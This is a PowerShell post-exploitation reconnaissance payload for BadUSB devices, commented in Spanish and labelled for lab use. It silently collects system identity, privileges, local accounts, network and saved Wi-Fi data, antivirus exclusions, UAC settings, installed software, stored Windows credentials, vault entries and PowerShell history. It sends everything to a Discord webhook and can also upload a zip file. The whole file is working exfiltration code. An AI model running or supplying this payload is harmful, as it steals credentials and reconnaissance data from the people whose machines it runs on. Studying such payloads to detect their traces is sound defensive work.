# ============================================================
# BadUSB Recon - Payload de reconocimiento post-explotacion
# ------------------------------------------------------------
# Entorno : Windows 10/11, PowerShell 5.1+
# Uso     : Educativo / laboratorio propio
# Autor   : 14ND3R
# Repo    : https://github.com/AndYLndR/badusb-recon-lab
# ============================================================

param(
    [string]$Webhook
)

$ErrorActionPreference = "SilentlyContinue"

# ------------------------------------------------------------
# CONFIGURACION
# Precedencia del webhook (de mayor a menor prioridad):
#   1. Parametro -Webhook (inyectado por el Ducky Script)
#   2. $Config.Webhook desde config.local.ps1 (modo desarrollo)
#   3. Variable de entorno $env:DISCORD_WEBHOOK (dev rapido)
#   4. PLACEHOLDER_WEBHOOK (si nada de lo anterior)
# ------------------------------------------------------------

$Config = @{
    Webhook = $null
    SendZip = $false
    ZipPath = "$env:TEMP\prueba.zip"
    MaxLen  = 1900
    DelayMs = 700
}

# 1. Parametro -Webhook (prioridad maxima)
if ($Webhook) {
    $Config.Webhook = $Webhook
}

# 2. config.local.ps1 (solo si no vino por parametro)
if (-not $Config.Webhook) {
    $configPath = if ($PSScriptRoot) {
        Join-Path $PSScriptRoot "..\config.local.ps1"
    } else {
        Join-Path (Get-Location) "config.local.ps1"
    }
    if (Test-Path $configPath) {
        . $configPath
        if ($Config.Webhook -and $Config.Webhook -notlike "*XXX*" -and $Config.Webhook -notlike "*PLACEHOLDER*") {
            # Ya esta cargado
        }
    }
}

# 3. Variable de entorno
if (-not $Config.Webhook -or $Config.Webhook -like "*PLACEHOLDER*") {
    if ($env:DISCORD_WEBHOOK) {
        $Config.Webhook = $env:DISCORD_WEBHOOK
    }
}

# 4. Placeholder final
if (-not $Config.Webhook) {
    $Config.Webhook = "PLACEHOLDER_WEBHOOK"
}

$Webhook = $Config.Webhook
$MaxLen  = $Config.MaxLen
$DelayMs = $Config.DelayMs

# Comprobacion final
if ($Webhook -like "*PLACEHOLDER*" -or $Webhook -like "*XXX*" -or $Webhook -notmatch "^https?://") {
    Write-Host "[-] No se ha configurado un webhook valido. Abortando." -ForegroundColor Red
    Write-Host "    Opciones:" -ForegroundColor Yellow
    Write-Host "      1. Ejecutar con -Webhook <url>"
    Write-Host "      2. Crear config.local.ps1 con `$Config.Webhook"
    Write-Host "      3. Exportar `$env:DISCORD_WEBHOOK"
    exit 1
}

$Webhook = $Config.Webhook
$MaxLen  = $Config.MaxLen
$DelayMs = $Config.DelayMs

# Si llegados a este punto sigue siendo placeholder, no podemos enviar nada
if ($Webhook -like "*PLACEHOLDER*" -or $Webhook -like "*XXX*") {
    Write-Host "[-] No se ha configurado el webhook. Abortando." -ForegroundColor Red
    Write-Host "    Opciones:" -ForegroundColor Yellow
    Write-Host "      1. Copia config.example.ps1 a config.local.ps1 y edítalo"
    Write-Host "      2. Exporta `$env:DISCORD_WEBHOOK"
    Write-Host "      3. Usa encode_base64.ps1 -Webhook <url>"
    exit 1
}

# ------------------------------------------------------------
# FUNCIÓN DE ENVÍO A DISCORD (con troceo automático)
# ------------------------------------------------------------
function Send-Discord {
    param(
        [string]$Title,
        [string]$Body
    )

    $text = "**$Title**`n``````$Body``````"
    $chunks = @()
    while ($text.Length -gt $MaxLen) {
        $chunks += $text.Substring(0, $MaxLen)
        $text    = $text.Substring($MaxLen)
    }
    if ($text.Length -gt 0) { $chunks += $text }

    foreach ($c in $chunks) {
        $json  = ConvertTo-Json @{ content = $c } -Compress
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
        try {
            Invoke-RestMethod -Uri $Webhook -Method Post -Body $bytes `
                -ContentType "application/json; charset=utf-8" | Out-Null
        } catch { }
        Start-Sleep -Milliseconds $DelayMs
    }
}

# ============================================================
# BLOQUE 1 — Identidad y sistema
# ============================================================
$u      = whoami
$h      = hostname
$dom    = $env:USERDOMAIN
$so     = (Get-CimInstance Win32_OperatingSystem).Caption
$build  = (Get-CimInstance Win32_OperatingSystem).BuildNumber
$arch   = $env:PROCESSOR_ARCHITECTURE
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$grupos = (whoami /groups | Out-String).Trim()
$privs  = (whoami /priv   | Out-String).Trim()
$admins = (net localgroup administrators | Out-String).Trim()
$users  = (net user | Out-String).Trim()

$bloque1 = @"
Usuario:  $u
Dominio:  $dom
Host:     $h
SO:       $so (build $build, $arch)
Boot:     $uptime

--- GRUPOS ---
$grupos

--- PRIVILEGIOS ---
$privs

--- ADMINS LOCALES ---
$admins

--- USUARIOS LOCALES ---
$users
"@
Send-Discord -Title "🖥️ BLOQUE 1 — Identidad y sistema" -Body $bloque1

# ============================================================
# BLOQUE 2 — Red
# ============================================================
$ip      = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -notlike '*Loopback*').IPAddress -join ', ')
$rutas   = (route print | Out-String).Trim()
$arp     = (arp -a | Out-String).Trim()
$dns     = (Get-DnsClientServerAddress -AddressFamily IPv4 | Out-String).Trim()
$netstat = (netstat -ano | Select-String "ESTABLISHED" | Select -First 40 | Out-String).Trim()
$wifi    = (netsh wlan show profiles | Out-String).Trim()
$fw      = (netsh advfirewall show allprofiles state | Out-String).Trim()

$bloque2 = @"
IPs:        $ip
DNS:        $dns

--- FIREWALL ---
$fw

--- RUTAS ---
$rutas

--- ARP ---
$arp

--- CONEXIONES ESTABLECIDAS ---
$netstat

--- WIFI GUARDADAS ---
$wifi
"@
Send-Discord -Title "🌐 BLOQUE 2 — Red" -Body $bloque2

# ============================================================
# BLOQUE 3 — Defensas
# ============================================================
$av     = (Get-MpComputerStatus | Select AMServiceEnabled, RealTimeProtectionEnabled, AntivirusEnabled, AntivirusSignatureLastUpdated, AMEngineVersion | Out-String).Trim()
$excl   = (Get-MpPreference | Select ExclusionPath, ExclusionProcess, ExclusionExtension | Out-String).Trim()
$uac    = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" | Select EnableLUA, ConsentPromptBehaviorAdmin | Out-String).Trim()
$appl   = (Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue | Out-String).Trim()

$bloque3 = @"
--- DEFENDER ---
$av

--- EXCLUSIONES ---
$excl

--- UAC ---
$uac

--- APPLOCKER ---
$appl
"@
Send-Discord -Title "🛡️ BLOQUE 3 — Defensas" -Body $bloque3

# ============================================================
# BLOQUE 4 — Procesos, servicios y software
# ============================================================
$proc   = (Get-Process | Sort-Object -Property WS -Descending | Select-Object -First 25 Name, Id, WS | Out-String).Trim()
$serv   = (Get-Service | Where-Object Status -eq "Running" | Select-Object -First 50 Name, DisplayName | Out-String).Trim()
$soft   = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" |
            Select-Object DisplayName, DisplayVersion, Publisher |
            Where-Object DisplayName | Out-String).Trim()
$tasks  = (schtasks /query /fo LIST /v | Select-String "TaskName|Run As User|Task To Run" | Select-Object -First 60 | Out-String).Trim()

$bloque4 = @"
--- TOP PROCESOS ---
$proc

--- SERVICIOS ACTIVOS ---
$serv

--- SOFTWARE INSTALADO ---
$soft

--- TAREAS PROGRAMADAS ---
$tasks
"@
Send-Discord -Title "⚙️ BLOQUE 4 — Procesos / Software" -Body $bloque4

# ============================================================
# BLOQUE 5 — Credenciales y secretos
# ============================================================
$cred   = (cmdkey /list | Out-String).Trim()
$vault  = (vaultcmd /listcreds:"Windows Credentials" /all | Out-String).Trim()
$pshist = if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
              Get-Content (Get-PSReadlineOption).HistorySavePath | Select-Object -Last 30 | Out-String
          } else { "sin historial PSReadline" }

$bloque5 = @"
--- CREDENTIAL MANAGER ---
$cred

--- WINDOWS VAULT ---
$vault

--- ULTIMOS COMANDOS PS ---
$pshist
"@
Send-Discord -Title "🔑 BLOQUE 5 — Credenciales y secretos" -Body $bloque5

# ============================================================
# BLOQUE 6 — Resumen de ejecución (útil para el análisis de IOCs)
# ============================================================
$resumen = @"
HostName: $env:COMPUTERNAME
Usuario:  $env:USERNAME
PID PS:   $PID
Ruta PS:  $PSHOME
Hora:     $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")

Estos datos son parte del experimento de IOCs del proyecto.
Revisar Event Log y Sysmon para ver las huellas generadas.
"@
Send-Discord -Title "📋 BLOQUE 6 — Resumen de ejecución" -Body $resumen

# ============================================================
# ZIP OPCIONAL (solo PS 7+)
# ============================================================
if ($Config.SendZip -and $PSVersionTable.PSVersion.Major -ge 7) {
    $zip = $Config.ZipPath
    if (Test-Path $zip) {
        try {
            Invoke-RestMethod -Uri $Webhook -Method Post -Form @{ files = Get-Item $zip } | Out-Null
            Remove-Item $zip -Force
        } catch { }
    }
}

Write-Host "[+] Recon completado. Revisa tu canal de Discord."